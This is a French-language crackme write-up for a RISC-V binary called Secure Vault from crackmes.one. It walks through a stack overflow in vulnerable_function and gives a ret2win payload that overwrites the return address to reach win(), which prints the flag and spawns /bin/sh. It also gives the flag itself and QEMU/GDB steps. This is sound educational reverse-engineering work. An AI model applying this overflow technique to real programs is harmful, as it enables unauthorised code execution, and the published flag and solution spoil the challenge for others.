# 23x41's Secure Vault

> **Origine** : [`ORIGIN.yml`](ORIGIN.yml) · [crackmes.one](https://crackmes.one/crackme/6a59d79ba27dfa335e4c8597) · id `6a59d79ba27dfa335e4c8597`

Crackme **ELF64 RISC-V**, C/C++, **statique**, non strippé. Intro ROP : overflow de stack → `win()`.
Auteur : [23x41](https://crackmes.one/user/23x41). Analyse **statique** (Capstone / pyelftools) — pas de QEMU RISC-V sur le serveur dédié.

Dossier : `authors/23x41/6a59d79ba27dfa335e4c8597/` — [famille](../README.md) · [repo](../../../README.md).

| Fichier | Rôle |
|---|---|
| [`securevault`](original/securevault) | binaire d’origine |
| [`README.md`](README.md) | ce write-up |
| [`securevault-solve.py`](tools/securevault-solve.py) | flag + payload ret2win |

## Réponse

| | |
|---|---|
| **Flag** | `FLAG{0x8A7_RISCV_ROP_WIN}` |
| **Payload** | `72 × 'A' + p64(0x10476)` (`win`) |

```bash
python3 tools/securevault-solve.py -q
python3 tools/securevault-solve.py --check          # vérif statique
# live (si qemu-riscv64 dispo) :
python3 tools/securevault-solve.py --payload | qemu-riscv64 original/securevault
```

---

## 1. Premier regard

```text
file original/securevault
# ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI,
# statically linked, not stripped

sha256: a2d496d8c402ec9c54ef12cc132ba30269044109811947a138d58b075dfb0e2a
Entry : 0x1039c
```

| Propriété | Valeur |
|---|---|
| Plateforme | Unix / Linux |
| Arch | RISC-V 64 (RVC) |
| Link | static |
| PIE | non (`ET_EXEC`) |
| Canary | non |
| Symboles | oui (`main`, `vulnerable_function`, `win`, …) |

Description site : overflow + ROP intro ; but = enchaîner jusqu’à l’accès (ici : ret2win suffit).

Chaînes utiles (`.rodata`, base `0x53390`) :

| VA | Texte |
|---|---|
| `0x53399` | `[ACCESS GRANTED]` |
| `0x533b0` | `FLAG{0x8A7_RISCV_ROP_WIN}` |
| `0x533d0` | `/bin/sh` |
| `0x533d8` | `Enter access code: ` |
| `0x533f0` | `SecureVault Authentication Terminal` |
| `0x53440` | `Access denied.` |

---

## 2. Flow

```text
main
  puts("SecureVault Authentication Terminal")
  puts("===================================")
  vulnerable_function()
  puts("Access denied.")
  return 0

vulnerable_function
  frame 0x50
  puts("Enter access code: ")
  fflush(stdout)
  read(0, buf, 0x100)          ← overflow
  return

win                              ← cible
  puts("[ACCESS GRANTED]")
  puts("FLAG{0x8A7_RISCV_ROP_WIN}")
  system("/bin/sh")
```

Sans overflow, `main` affiche toujours `Access denied.` après le retour de `vulnerable_function`. Le flag n’est jamais imprimé sur le chemin nominal — il faut détourner `ra`.

---

## 3. Prédicat / overflow

### Frame de `vulnerable_function` (`0x104ac`)

```text
c.addi16sp  sp, -0x50
c.sdsp      ra, 0x48(sp)
c.sdsp      s0, 0x40(sp)
c.addi4spn  s0, sp, 0x50      ; s0 = sp+0x50 (frame pointer)
…
addi        a5, s0, -0x50     ; buf = s0-0x50 = sp
addi        a2, zero, 0x100
mv          a1, a5
li          a0, 0
jal         read              ; read(0, buf, 256)
…
c.ldsp      ra, 0x48(sp)
c.ldsp      s0, 0x40(sp)
c.addi16sp  sp, 0x50
c.jr        ra
```

| Slot | Offset depuis `sp` / `buf` |
|---|---|
| buffer | `0x00` … |
| saved `s0` | `0x40` (64) |
| saved `ra` | `0x48` (72) |

`read` accepte **256** octets dans un frame de **80** → écrasement de `s0` puis `ra`.

### `win` (`0x10476`)

```text
puts("[ACCESS GRANTED]");
puts(FLAG);
system("/bin/sh");
```

Adresses (pas de PIE) :

| Symbole | VA |
|---|---|
| `win` | `0x10476` |
| `vulnerable_function` | `0x104ac` |
| `main` | `0x104ea` |
| `system` | `0x110e2` |
| `puts` | `0x14d20` |
| `read` | `0x20204` |

### Chaîne ROP minimale (ret2win)

```python
payload = b"A" * 72 + struct.pack("<Q", 0x10476)
```

Sur RISC-V le retour fait `ldsp ra` + `jr ra` : il suffit d’écraser `ra` avec l’adresse de `win`. Pas besoin de gadgets `pop` pour ce challenge (intro).

---

## Debug GDB (pas à pas) — RISC-V

Arch **RISC-V 64** : le GDB hôte x86_64 ne charge / n’exécute pas ce binaire tel quel. Il faut **`qemu-riscv64`** (user) + **`gdb-multiarch`** (ou un GDB configuré `riscv64`).

> Sur le serveur dédié de ce repo : pas d’émulateur RISC-V → section écrite pour une machine où `qemu-riscv64` / `gdb-multiarch` sont installés. La vérif locale reste `--check` statique.

### 4.1 Lancer sous QEMU + gdbstub

Terminal A :

```bash
qemu-riscv64 -g 1234 ./original/securevault
```

Terminal B :

```bash
gdb-multiarch -q ./original/securevault
(gdb) set arch riscv:rv64
(gdb) target remote :1234
(gdb) info address win                    # 0x10476
(gdb) info address vulnerable_function    # 0x104ac
(gdb) break vulnerable_function
(gdb) continue
```

### 4.2 Frame et `ra`

```text
(gdb) disassemble vulnerable_function
# c.addi16sp sp, -0x50
# c.sdsp     ra, 0x48(sp)
# …
# read(0, sp, 0x100)
# c.ldsp     ra, 0x48(sp)
# c.jr       ra
```

```text
(gdb) break *vulnerable_function+…       # juste avant read, ou après
(gdb) continue
# taper un code court d’abord pour voir le chemin nominal
(gdb) print/x $ra                        # retour vers main
(gdb) x/gx $sp+0x48                      # slot saved ra
```

### 4.3 Ret2win sous le debugger

```text
(gdb) break win
(gdb) # redémarrer qemu+gdb avec le payload :
# python3 tools/securevault-solve.py --payload | qemu-riscv64 -g 1234 ./original/securevault
(gdb) continue
# hit win → puts FLAG
(gdb) x/s 0x533b0                        # FLAG{0x8A7_RISCV_ROP_WIN}
```

Sans GDB, live direct :

```bash
python3 tools/securevault-solve.py --payload | qemu-riscv64 ./original/securevault
```

### 4.4 Inspection statique (sans QEMU)

```bash
readelf -s original/securevault | grep -E ' win$|vulnerable_function| main$'
# win @ 0x10476, vulnerable_function @ 0x104ac, main @ 0x104ea
python3 tools/securevault-solve.py --check
```

Capstone / `riscv64-linux-gnu-objdump -d` si la toolchain cross est installée — même prologue que §3.

---

## 4. Vérification

**Statique** (ce serveur, sans QEMU) :

```bash
python3 tools/securevault-solve.py --check
# OK : symboles, prologue (frame 0x50 / ra@0x48), flag dans le binaire
python3 tools/securevault-solve.py -q
# FLAG{0x8A7_RISCV_ROP_WIN}
```

**Live** (machine avec `qemu-riscv64` / binfmt RISC-V) :

```bash
python3 tools/securevault-solve.py --run
# ou :
python3 tools/securevault-solve.py --payload | qemu-riscv64 original/securevault
```

Attendu : `[ACCESS GRANTED]`, le flag, puis un shell.

> Preuve live **non** rejouée ici : serveur dédié sans émulateur RISC-V user-mode.

---

## 5. Notes

- Le flag est **en clair** dans `.rodata` — on peut le lire sans exploiter ; l’exercice vise le **ret2win** / ROP RISC-V.
- `win` enchaîne aussi `system("/bin/sh")` : au-delà du flag, c’est un vrai shell si l’émulation I/O le permet.
- Stack canary / PIE absents : volontaire pour une intro.
- Compilateur vu par DIE : GCC (Debian 15.3.0).
- Ce n’est **pas** un keygen name→serial ; pas de username `petik`.
